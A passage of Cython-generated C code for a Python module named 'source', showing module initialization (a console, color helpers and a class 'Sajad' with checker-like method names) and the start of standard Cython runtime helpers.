  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_7 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 346, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_1 = PyList_New(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 346, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_u_white);
  __Pyx_GIVEREF(__pyx_n_u_white);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_u_white);
  __Pyx_INCREF(__pyx_n_u_blue);
  __Pyx_GIVEREF(__pyx_n_u_blue);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_n_u_blue);
  if (PyDict_SetItem(__pyx_t_7, __pyx_n_s_colors, __pyx_t_1) < 0) __PYX_ERR(0, 346, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_t_7, __pyx_n_s_align, __pyx_n_u_center) < 0) __PYX_ERR(0, 346, __pyx_L1_error)
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__55, __pyx_t_7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 346, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_output, __pyx_t_1) < 0) __PYX_ERR(0, 346, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_output); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 347, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_7 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 347, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  
  __pyx_t_7 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__56, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  
  __pyx_t_7 = PyNumber_Multiply(__pyx_kp_u_1_39m, __pyx_int_60); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_token_hex); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 350, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__57, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 350, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = PyNumber_Multiply(__pyx_t_7, __pyx_int_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 350, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_cok, __pyx_t_1) < 0) __PYX_ERR(0, 350, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_uuid); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallNoArg(__pyx_t_7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_uuid, __pyx_t_7) < 0) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_Console); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_1 = __Pyx_PyObject_CallNoArg(__pyx_t_7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_console, __pyx_t_1) < 0) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_Console); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_7 = __Pyx_PyObject_CallNoArg(__pyx_t_1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_console, __pyx_t_7) < 0) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  
  __pyx_t_7 = __Pyx_CyFunction_New(&__pyx_mdef_6source_1sg, 0, __pyx_n_s_sg, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__59)); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 356, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_sg, __pyx_t_7) < 0) __PYX_ERR(0, 356, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  
  __pyx_t_7 = __Pyx_Py3MetaclassPrepare((PyObject *) NULL, __pyx_empty_tuple, __pyx_n_s_com, __pyx_n_s_com, (PyObject *) NULL, __pyx_n_s_source, (PyObject *) NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 361, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_3com_1red, 0, __pyx_n_s_com_red, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__60)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 362, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_red, __pyx_t_1) < 0) __PYX_ERR(0, 362, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_3com_3grn, 0, __pyx_n_s_com_grn, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__61)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 365, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_grn, __pyx_t_1) < 0) __PYX_ERR(0, 365, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_3com_5yalo, 0, __pyx_n_s_com_yalo, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__62)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 368, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_yalo, __pyx_t_1) < 0) __PYX_ERR(0, 368, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_3com_7blo, 0, __pyx_n_s_com_blo, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__63)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 371, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_blo, __pyx_t_1) < 0) __PYX_ERR(0, 371, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_3com_9orde, 0, __pyx_n_s_com_orde, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__64)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 374, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_orde, __pyx_t_1) < 0) __PYX_ERR(0, 374, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_3com_11blodk, 0, __pyx_n_s_com_blodk, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__65)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 377, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_blodk, __pyx_t_1) < 0) __PYX_ERR(0, 377, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_3com_13A, 0, __pyx_n_s_com_A, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__66)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 380, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_A, __pyx_t_1) < 0) __PYX_ERR(0, 380, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_3com_15brt, 0, __pyx_n_s_com_brt, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__67)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 383, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_brt, __pyx_t_1) < 0) __PYX_ERR(0, 383, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Py3ClassCreate(((PyObject*)&__Pyx_DefaultClassType), __pyx_n_s_com, __pyx_empty_tuple, __pyx_t_7, NULL, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 361, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_com, __pyx_t_1) < 0) __PYX_ERR(0, 361, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  
  __pyx_t_7 = __Pyx_Py3MetaclassPrepare((PyObject *) NULL, __pyx_empty_tuple, __pyx_n_s_Sajad, __pyx_n_s_Sajad, (PyObject *) NULL, __pyx_n_s_source, (PyObject *) NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 387, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_5Sajad_1__init__, 0, __pyx_n_s_Sajad___init, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__69)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 388, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_init, __pyx_t_1) < 0) __PYX_ERR(0, 388, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_5Sajad_3chkfile, 0, __pyx_n_s_Sajad_chkfile, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__71)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 404, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_chkfile, __pyx_t_1) < 0) __PYX_ERR(0, 404, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_5Sajad_5tokenbot, 0, __pyx_n_s_Sajad_tokenbot, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__73)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 420, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_tokenbot, __pyx_t_1) < 0) __PYX_ERR(0, 420, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_5Sajad_7chk, 0, __pyx_n_s_Sajad_chk, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__75)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 427, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_chk, __pyx_t_1) < 0) __PYX_ERR(0, 427, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_5Sajad_9idtle, 0, __pyx_n_s_Sajad_idtle, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__77)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 668, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_idtle, __pyx_t_1) < 0) __PYX_ERR(0, 668, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_5Sajad_11getcnre, 0, __pyx_n_s_Sajad_getcnre, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__79)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 678, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_SetNameInClass(__pyx_t_7, __pyx_n_s_getcnre, __pyx_t_1) < 0) __PYX_ERR(0, 678, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Py3ClassCreate(((PyObject*)&__Pyx_DefaultClassType), __pyx_n_s_Sajad, __pyx_empty_tuple, __pyx_t_7, NULL, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 387, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Sajad, __pyx_t_1) < 0) __PYX_ERR(0, 387, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  
  __pyx_t_7 = __Pyx_CyFunction_New(&__pyx_mdef_6source_3dosyasil, 0, __pyx_n_s_dosyasil, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__80)); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 692, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_dosyasil, __pyx_t_7) < 0) __PYX_ERR(0, 692, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_M, __pyx_kp_u_1_32m) < 0) __PYX_ERR(0, 700, __pyx_L1_error)

  
  __pyx_t_7 = PyList_New(0); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 701, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ids, __pyx_t_7) < 0) __PYX_ERR(0, 701, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  
  __pyx_t_7 = __Pyx_CyFunction_New(&__pyx_mdef_6source_5get_id, 0, __pyx_n_s_get_id, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__82)); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 704, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_get_id, __pyx_t_7) < 0) __PYX_ERR(0, 704, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  
  __pyx_t_7 = __Pyx_CyFunction_New(&__pyx_mdef_6source_7get_username, 0, __pyx_n_s_get_username, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__84)); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 713, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_get_username, __pyx_t_7) < 0) __PYX_ERR(0, 713, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  
  __pyx_t_7 = __Pyx_CyFunction_New(&__pyx_mdef_6source_9dosyasil, 0, __pyx_n_s_dosyasil, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__85)); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 749, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_dosyasil, __pyx_t_7) < 0) __PYX_ERR(0, 749, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  
  __pyx_t_7 = __Pyx_CyFunction_New(&__pyx_mdef_6source_11ana_menu, 0, __pyx_n_s_ana_menu, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__87)); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 757, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ana_menu, __pyx_t_7) < 0) __PYX_ERR(0, 757, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_name_2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 777, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_10 = (__Pyx_PyUnicode_Equals(__pyx_t_7, __pyx_n_u_main, Py_EQ)); if (unlikely(__pyx_t_10 < 0)) __PYX_ERR(0, 777, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (__pyx_t_10) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_ana_menu); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 778, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_1 = __Pyx_PyObject_CallNoArg(__pyx_t_7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 778, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
  }

  
  __pyx_t_1 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_1) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /*--- Wrapped vars code ---*/

  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_9);
  if (__pyx_m) {
    if (__pyx_d) {
      __Pyx_AddTraceback("init source", __pyx_clineno, __pyx_lineno, __pyx_filename);
    }
    Py_CLEAR(__pyx_m);
  } else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_ImportError, "init source");
  }
  __pyx_L0:;
  __Pyx_RefNannyFinishContext();
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  return (__pyx_m != NULL) ? 0 : -1;
  #elif PY_MAJOR_VERSION >= 3
  return __pyx_m;
  #else
  return;
  #endif
}

/* --- Runtime support code --- */
/* Refnanny */
#if CYTHON_REFNANNY
static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {
    PyObject *m = NULL, *p = NULL;
    void *r = NULL;
    m = PyImport_ImportModule(modname);
    if (!m) goto end;
    p = PyObject_GetAttrString(m, "RefNannyAPI");
    if (!p) goto end;
    r = PyLong_AsVoidPtr(p);
end:
    Py_XDECREF(p);
    Py_XDECREF(m);
    return (__Pyx_RefNannyAPIStruct *)r;
}
#endif

/* PyObjectGetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro))
        return tp->tp_getattro(obj, attr_name);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_getattr))
        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));
#endif
    return PyObject_GetAttr(obj, attr_name);
}
#endif

/* GetBuiltinName */
static PyObject *__Pyx_GetBuiltinName(PyObject *name) {
    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);
    if (unlikely(!result)) {
        PyErr_Format(PyExc_NameError,
#if PY_MAJOR_VERSION >= 3
            "name '%U' is not defined", name);
#else
            "name '%.200s' is not defined", PyString_AS_STRING(name));
#endif
    }
    return result;
}

/* KeywordStringCheck */
static int __Pyx_CheckKeywordStrings(
    PyObject *kwdict,
    const char* function_name,
    int kw_allowed)
{
    PyObject* key = 0;
    Py_ssize_t pos = 0;
#if CYTHON_COMPILING_IN_PYPY
    if (!kw_allowed && PyDict_Next(kwdict, &pos, &key, 0))
        goto invalid_keyword;
    return 1;
#else
    while (PyDict_Next(kwdict, &pos, &key, 0)) {
        #if PY_MAJOR_VERSION < 3
        if (unlikely(!PyString_Check(key)))
        #endif
            if (unlikely(!PyUnicode_Check(key)))
                goto invalid_keyword_type;
    }
    if ((!kw_allowed) && unlikely(key))
        goto invalid_keyword;
    return 1;
invalid_keyword_type:
    PyErr_Format(PyExc_TypeError,
        "%.200s() keywords must be strings", function_name);
    return 0;
#endif
invalid_keyword:
    PyErr_Format(PyExc_TypeError,
    #if PY_MAJOR_VERSION < 3
        "%.200s() got an unexpected keyword argument '%.200s'",
        function_name, PyString_AsString(key));
    #else
        "%s() got an unexpected keyword argument '%U'",
        function_name, key);
    #endif
    return 0;
}

/* PyDictVersioning */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {
    PyObject **dictptr = NULL;
    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;
    if (offset) {
#if CYTHON_COMPILING_IN_CPYTHON
        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);
#else
        dictptr = _PyObject_GetDictPtr(obj);
#endif
    }
    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;
}
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))
        return 0;
    return obj_dict_version == __Pyx_get_object_dict_version(obj);
}
#endif

/* GetModuleGlobalName */
#if CYTHON_USE_DICT_VERSIONS
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)
#else
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)
#endif
{
    PyObject *result;
#if !CYTHON_AVOID_BORROWED_REFS
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    } else if (unlikely(PyErr_Occurred())) {
        return NULL;
    }
#else
    result = PyDict_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
#endif
#else
    result = PyObject_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
    PyErr_Clear();
#endif
    return __Pyx_GetBuiltinName(name);
}

/* PyFunctionFastCall */
#if CYTHON_FAST_PYCALL
static PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject *co, PyObject **args, Py_ssize_t na,
                                               PyObject *globals) {
    PyFrameObject *f;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject **fastlocals;
    Py_ssize_t i;
    PyObject *result;
    assert(globals != NULL);
    /* XXX Perhaps we should create a specialized
       PyFrame_New() that doesn't take locals, but does
       take builtins without sanity checking them.
       */
    assert(tstate != NULL);
    f = PyFrame_New(tstate, co, globals, NULL);
    if (f == NULL) {
        return NULL;
    }
    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);
    for (i = 0; i < na; i++) {
        Py_INCREF(*args);
        fastlocals[i] = *args++;
    }
    result = PyEval_EvalFrameEx(f,0);
    ++tstate->recursion_depth;
    Py_DECREF(f);
    --tstate->recursion_depth;
    return result;
}
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs) {
    PyCodeObject *co = (PyCodeObject *)PyFunction_GET_CODE(func);
    PyObject *globals = PyFunction_GET_GLOBALS(func);
    PyObject *argdefs = PyFunction_GET_DEFAULTS(func);
    PyObject *closure;
#if PY_MAJOR_VERSION >= 3
    PyObject *kwdefs;
#endif
    PyObject *kwtuple, **k;
    PyObject **d;
    Py_ssize_t nd;
    Py_ssize_t nk;
    PyObject *result;
    assert(kwargs == NULL || PyDict_Check(kwargs));
    nk = kwargs ? PyDict_Size(kwargs) : 0;
    if (Py_EnterRecursiveCall((char*)" while calling a Python object")) {
        return NULL;
    }
    if (
#if PY_MAJOR_VERSION >= 3
            co->co_kwonlyargcount == 0 &&
#endif
            likely(kwargs == NULL || nk == 0) &&
